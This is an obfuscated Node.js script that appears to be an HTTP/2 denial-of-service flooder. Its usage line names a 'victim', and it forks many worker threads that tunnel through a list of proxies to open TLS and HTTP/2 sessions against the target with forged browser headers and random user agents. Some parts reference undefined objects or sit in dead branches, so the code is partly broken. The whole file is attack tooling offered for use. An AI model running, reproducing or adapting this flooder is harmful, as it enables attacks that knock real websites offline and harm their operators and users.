(function (_0x129ba3, _0x6331ba) {
  const _0xaf7670 = _0x129ba3();
  while (true) {
    try {
      const _0x301243 = parseInt(_0x258b(454, -294)) / 1 * (parseInt(_0x258b(367, -240)) / 2) + parseInt(_0x258b(493, 4)) / 3 * (parseInt(_0x258b(405, -585)) / 4) + -parseInt(_0x258b(427, -25)) / 5 * (-parseInt(_0x258b(316, -462)) / 6) + -parseInt(_0x258b(506, -73)) / 7 + -parseInt(_0x258b(174, 854)) / 8 + -parseInt(_0x258b(399, 402)) / 9 + parseInt(_0x258b(191, -830)) / 10;
      if (_0x301243 === _0x6331ba) {
        break;
      } else {
        _0xaf7670.push(_0xaf7670.shift());
      }
    } catch (_0x38a743) {
      _0xaf7670.push(_0xaf7670.shift());
    }
  }
})(_0x2746, 135838);
function _0x2746() {
  const _0x5a5a77 = ["setKe", "HTTP/", "6-SHA", ":sche", "APBgC", "name", "6:ECD", "_AES_", "destr", "out", "tpReq", "Zngqg", "epAli", "com", "leSiz", "ZnPxP", "KHLAS", ":443 ", "1560213higoxm", "ALPNP", "HE-RS", "nzshI", "tls", "4:!MD", "4532kJkFyS", "Aedib", "clust", "eEmai", "clien", "port", "y Fil", "ectio", "vntSw", ":auth", "jAdrn", "!aNUL", "tlare", "r-gen", "EOuzQ", "uest", "vwCRa", "nAMTN", "FElSO", "T:!DE", "XeYWu", "thori", "285Cjviwx", "hPUHm", "ES256", "rsion", "des", "IOUsk", "8-GCM", "uri", "5:!PS", "LAwvx", "ES128", "devic", "readF", "rTabl", ":443\r", "pPiGs", "rOrde", "excee", "LuMwM", "follo", "HUsoh", "ePush", "setMa", "GiGeW", "erato", "zTmWc", "A-AES", "6599PorvNN", "fqXhJ", "ing", "keep-", "rname", "dImkD", "alid ", "echdC", "keiBm", ":DHE-", "tls-m", "uCbhf", "gMfPg", "dFkug", "L:!eN", "heade", "bORXC", "error", "inclu", "crypt", "ECDHE", "reams", "entSt", "rotoc", ":meth", "CONNE", "xList", "xTnwp", "httpV", "mCVEU", "84:TL", "setti", "ded", "wAllR", "pPQwL", "href", "proxy", "argv", "jlTzY", "255COuBjX", "setTi", "oding", "lengt", "EQjjw", "128-S", "Host:", "aderL", "node ", "rando", "cSDoY", ":443", "isMas", "186935gboIuI", "E:X25", "1305_", "stCer", "oSolv", "XGhdo", "tUBys", "ncurr", "56:EC", "HIGH:", "tqQbV", "BMXJd", "uncau", "ULL:!", "secur", "conne", "NugNz", "PNJkM", "CyWub", "E-RSA", "opera", "creat", "dyPUM", "-SHA2", ": inv", "agent", "25519", "DHE-E", "che", "HSpRp", "nse", "Memor", "tQVGS", "ggwph", "x-req", "gVAdk", "socke", "maxCo", "Mspvo", "pbIrX", "HA384", "Ajlbp", "event", "ghVqm", "K:!SR", "SHA25", "brows", "Dynam", "WYroH", "no-ca", "LKlFJ", "CHmDW", "PYOEa", "ileSy", "exit", "56:DH", "end", "user-", "MaxTi", "initi", "firef", "deskt", "en-US", "windo", "decod", "_SHA3", "A256:", "rejec", "HTTP", "toStr", "floor", "1.1\r\n", "qsxgB", "kmyIf", "CHA20", "t-enc", "128_G", "ELTwJ", "856776pOLjPy", "trail", "QcVqC", "pWkVR", "istSi", "GULmx", "cts", "ystem", "net", "KDKhJ", "uests", "local", "e-req", "vbLRC", "maxSe", "utf-8", "TLS_A", "1796830CePsyG", "pTixu", "ter", "HrfNv", "NXqPF", "OPepr", "engeT", "pciyd", "https", "NvVvW", "ners", "56-SH", "ciphe", "alWin", "col", "ueste", "GrCQx", "Refer", "[Prox", "1.1 2", "host", "SA-AE", "6:TLS", "n: Ke", ":ECDH", "File", "SHA38", "alive", "close", "tUnau", "upgra", "519:x", "ghtEx", "lUYNl", "Liste", "tingS", "ssion", "RhTUZ", "kzKxW", "KLuJS", "rNHKZ", "ers", "time", "minVe", "AES12", "S_CHA", "ARGET", "DHE-R", "_POLY", "HVZWv", "XMLHt", "respo", "eSize", "4:DHE", "GREAS", "lDflP", "ysVNn", "LeKhn", "serve", "6_GCM", "CDHE-", "hgycC", "addre", "cooki", "chall", "eConn", "yTpqZ", "data", "Cooki", "guage", "flate", "Rate", "Conne", "CM_SH", "ead] ", "ALHLX", "parse", "GCM-S", "E-ECD", "OzpTp", " [Thr", "path", "hynDF", "ogle.", "pEKFL", "reque", "YZdvT", "honor", "-AES2", "Zdaed", "MELLI", "CnPRe", "ols", "HA256", "roxy ", "zed", "ZfvwJ", "dSlSz", "ep-Al", "d-wit", " / HT", "eners", "CT ", "QTvAh", ": tim", "maxDe", "EXPOR", "mPwJr", "USusc", "tTime", "t-lan", "UltsB", "enabl", "nBevv", "sQvmT", "targe", "accep", "GET", "de-in", "S:!RC", "ive\r\n", "from", "cepti", "-RSA-", "Emitt", "2298nCjcxX", "url", "] [TI", "BtZeH", "defau", "meout", "UXQeW", ":path", "ction", "RRuLs", "P:!CA", "jkwno", "-GCM-", "write", "pragm", "ngs", "ltMax", "icTab", "RQ/S]", "KfFUu", "kMsDW", "hjQbm", "RSA-A", "ority", "ersio", "ix [T", "edire", "maxHe", "xcdoK", "AeTWo", "ME] [", "ES_25", "\nConn", "SNKIe", "urve", "AES25", "S256-", "jBhlo", "wQFUl", "QycNz", "threa", "hnCkV", "rom p", "Event", "http2", "nse f", "TP/2", "PVKhx", "YIQfE", "yfCjD", "fork", "44TDmjqq", "log", "eout ", "384:E", "mNWSF", "timeo", "dowSi", "split", "mlmyZ", "Psapq", "proto", "CDSA-", "Ciphe", "://go"];
  _0x2746 = function () {
    return _0x5a5a77;
  };
  return _0x2746();
}
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const UserAgent = require("user-agents");
const fs = require('fs');
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (_0x26f945) {});
if (process.argv.length < 7) {
  console.log("node http-caclo [victim] [time] [rate] [threads] [proxylist]");
  process.exit();
}
const headers = {};
function readLines(_0x354c66) {
  return fs.readFileSync(_0x354c66, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0xbb22a4, _0x52eb04) {
  return Math.floor(Math.random() * (_0x52eb04 - _0xbb22a4) + _0xbb22a4);
}
function randomElement(_0x53360e) {
  return _0x53360e[Math.floor(Math.random() * (_0x53360e.length - 0) + 0)];
}
const _0x2f85d6 = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6]
};
var proxies = fs.readFileSync(_0x2f85d6.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(_0x2f85d6.target);
const _0x5e1a6f = {};
function _0x258b(_0x165a39, _0x32e711) {
  const _0x4d69c5 = _0x2746();
  _0x258b = function (_0x26dd91, _0x39c5f0) {
    _0x26dd91 = _0x26dd91 - 155;
    let _0x241934 = _0x4d69c5[_0x26dd91];
    return _0x241934;
  };
  return _0x258b(_0x165a39, _0x32e711);
}
_0x5e1a6f.name = "firefox";
function _0x19ee2d(_0xb6a83c, _0x291ef1, _0x39c6f1, _0x2364ff, _0x5b0a03) {
  return _0x258b(_0x5b0a03 - 243, _0x291ef1);
}
_0x5e1a6f.minVersion = 100;
_0x5e1a6f.httpVersion = '2';
if (cluster.isMaster) {
  for (let counter = 1; counter <= _0x2f85d6.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x342f4d, _0x3189a5) {
    const _0x1d44e9 = {
      'EOuzQ': function (_0x9ebd35, _0x2f85a0) {
        return _0x9ebd35 === _0x2f85a0;
      },
      'pTixu': "tQVGS",
      'GULmx': function (_0x5e63e5, _0x543d3b) {
        return _0x5e63e5 < _0x543d3b;
      },
      'UXQeW': "response",
      'GrCQx': function (_0x372951, _0x141324) {
        return _0x372951 !== _0x141324;
      },
      'mCVEU': "HUsoh",
      'dFkug': "nBevv",
      'gVAdk': "utf-8",
      'ZnPxP': "HTTP/1.1 200",
      'XeYWu': function (_0x334319, _0x2a8cf9) {
        return _0x334319 === _0x2a8cf9;
      },
      'dImkD': "qsxgB",
      'yfCjD': "vntSw",
      'LKlFJ': function (_0x3be59e, _0x21ac0a, _0x495df5) {
        return _0x3be59e(_0x21ac0a, _0x495df5);
      },
      'NXqPF': "error: invalid response from proxy server",
      'bORXC': function (_0x5c0a1d, _0x2f6b3a, _0x387bcd) {
        return _0x5c0a1d(_0x2f6b3a, _0x387bcd);
      },
      'hjQbm': "nAMTN",
      'NvVvW': function (_0x23d691, _0x23014c, _0x3dc289) {
        return _0x23d691(_0x23014c, _0x3dc289);
      },
      'XGhdo': "error: timeout exceeded",
      'FElSO': function (_0x41c505, _0x307805, _0x44e210) {
        return _0x41c505(_0x307805, _0x44e210);
      },
      'xcdoK': "ggwph",
      'pEKFL': "Zdaed",
      'jlTzY': function (_0x4a7ced, _0x33604c) {
        return _0x4a7ced + _0x33604c;
      },
      'KDKhJ': "error: ",
      'YIQfE': function (_0x37b59a, _0x1aff53) {
        return _0x37b59a + _0x1aff53;
      },
      'ysVNn': "CONNECT ",
      'vbLRC': ":443 HTTP/1.1\r\nHost: ",
      'HSpRp': ":443\r\nConnection: Keep-Alive\r\n\r\n",
      'LAwvx': function (_0x24b7ea, _0x5043a1) {
        return _0x24b7ea * _0x5043a1;
      },
      'hnCkV': "connect",
      'jkwno': "data",
      'QcVqC': "timeout",
      'Zngqg': "error"
    };
    const _0x481e9e = "CONNECT " + _0x342f4d.address + ":443 HTTP/1.1\r\nHost: " + _0x342f4d.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x393eb2 = new Buffer.from(_0x481e9e);
    const _0x42ecf0 = {
      "host": _0x342f4d.host,
      "port": _0x342f4d.port
    };
    const _0x526ed1 = net.connect(_0x42ecf0);
    _0x526ed1.setTimeout(_0x342f4d.timeout * 10000);
    _0x526ed1.setKeepAlive(true, 60000);
    _0x526ed1.on("connect", () => {
      _0x526ed1.write(_0x393eb2);
    });
    _0x526ed1.on("data", _0x425926 => {
      function _0x3ef3e4(_0xf5426f, _0x163fe3, _0x323408, _0x33a8d6, _0x14c1db) {
        const _0x45ff4d = {
          angiU: "push"
        };
        _0x45ff4d.xlsar = "shift";
        return _0x258b(_0x33a8d6 + 1332 - 1608 + 952, _0x163fe3);
      }
      if (_0x1d44e9[_0x3ef3e4(-605, -491, -510, -469, -635)]("HUsoh", "nBevv")) {
        const _0x2c01d2 = _0x425926["toStr" + _0x3ef3e4(-202, -74, -95, -220, -242)]("utf-8");
        const _0x2fd751 = _0x2c01d2[_0x3ef3e4(-33, -245, -158, -204, -194) + "des"]("HTTP/1.1 200");
        if (_0x2fd751 === false) {
          if ("qsxgB" !== _0x1d44e9[_0x3ef3e4(-233, -106, -360, -311, -117)]) {
            _0x526ed1[_0x3ef3e4(-436, -224, -348, -287, -177) + 'oy']();
            return _0x3189a5(undefined, "error: invalid response from proxy server");
          } else {
            for (let _0x35ff4b = 0; _0x35ff4b < _0x12d1d8[_0x3ef3e4(-533, -368, -240, -414, -361)]; _0x35ff4b++) {
              const _0x278522 = _0x45a447.request(_0x4c9f6b).on("response", _0xab4979 => {
                _0x278522.close();
                _0x278522.destroy();
                return;
              });
              _0x278522.end();
            }
          }
        }
        return _0x3189a5(_0x526ed1, undefined);
      } else {
        _0xe7230c.fork();
      }
    });
    _0x526ed1.on("timeout", () => {
      _0x526ed1.destroy();
      return _0x3189a5(undefined, "error: timeout exceeded");
    });
    _0x526ed1.on("error", _0x46869f => {
      _0x526ed1.destroy();
      return _0x3189a5(undefined, "error: " + _0x46869f);
    });
  }
}
const Header = new NetSocket();
headers[":method"] = "GET";
function _0x4bea06(_0x57d694, _0x19fcb6, _0xcb2adf, _0x5c8003, _0x393b2e) {
  return _0x258b(_0x19fcb6 + 105, _0x393b2e);
}
headers.GET = " / HTTP/2";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers.Referer = "https://google.com";
function _0x359fd4(_0x145190, _0x4a8fa1, _0xfa7a0, _0x1874e7, _0x3b247b) {
  return _0x258b(_0x1874e7 - 235, _0x145190);
}
headers.accept = randomHeaders.accept;
function _0x39627b(_0x6fcd59, _0x49d82f, _0xb3cc5c, _0x150485, _0x55ff41) {
  return _0x258b(_0x6fcd59 + 952, _0x150485);
}
function _0x4fd937(_0x161590, _0x4d59a5, _0x94f360, _0x1e32b7, _0x3e8896) {
  return _0x258b(_0x161590 - 237, _0x4d59a5);
}
headers["accept-language"] = randomHeaders["accept-language"];
headers["accept-encoding"] = randomHeaders["accept-encoding"];
headers.Connection = "keep-alive";
headers["upgrade-insecure-requests"] = randomHeaders["upgrade-insecure-requests"];
headers.TE = "trailers";
headers["x-requested-with"] = "XMLHttpRequest";
headers.pragma = "no-cache";
headers.Cookie = randomHeaders.cookie;
function runFlooder() {
  const _0x82297e = proxies[Math.floor(Math.random() * (proxies.length - 0) + 0)];
  const _0x30f356 = _0x82297e.split(':');
  const _0x3182e1 = new UserAgent();
  var _0x43d41c = _0x3182e1.toString();
  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = _0x43d41c;
  const _0x4ceb2a = {
    'host': _0x30f356[0],
    'port': ~~_0x30f356[1],
    'address': parsedTarget.host + ":443",
    'timeout': 0x64
  };
  Header.HTTP(_0x4ceb2a, (_0x77ea26, _0x3d18f5) => {
    if (_0x3d18f5) {
      return;
    }
    _0x77ea26.setKeepAlive(true, 60000);
    const _0x10010e = {
      ALPNProtocols: ['h2'],
      followAllRedirects: true,
      challengeToSolve: 5,
      clientTimeout: 5000,
      clientlareMaxTimeout: 15000,
      echdCurve: "GREASE:X25519:x25519",
      ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
      rejectUnauthorized: false,
      socket: _0x77ea26,
      decodeEmails: false,
      honorCipherOrder: true,
      requestCert: true,
      secure: true,
      port: 443,
      uri: parsedTarget.host,
      servername: parsedTarget.host
    };
    const _0xb8c9e9 = tls.connect(443, parsedTarget.host, _0x10010e);
    _0xb8c9e9.setKeepAlive(true, 600000);
    const _0x28b51e = {
      headerTableSize: 65536,
      maxConcurrentStreams: 1000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      enablePush: false
    };
    const _0x31b798 = {
      protocol: "https:",
      settings: _0x28b51e,
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => _0xb8c9e9,
      socket: _0x77ea26
    };
    const _0x1356df = http2.connect(parsedTarget.href, _0x31b798);
    const _0x534b56 = {
      headerTableSize: 65536,
      maxConcurrentStreams: 20000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      enablePush: false
    };
    _0x1356df.settings(_0x534b56);
    _0x1356df.on("connect", () => {});
    _0x1356df.on("close", () => {
      _0x1356df.destroy();
      _0x77ea26.destroy();
      return;
    });
    _0x1356df.on("error", _0x3c7c10 => {
      _0x1356df.destroy();
      _0x77ea26.destroy();
      return;
    });
  });
}
const KillScript = () => process.exit(1);
setTimeout(KillScript, _0x2f85d6.time * 1000);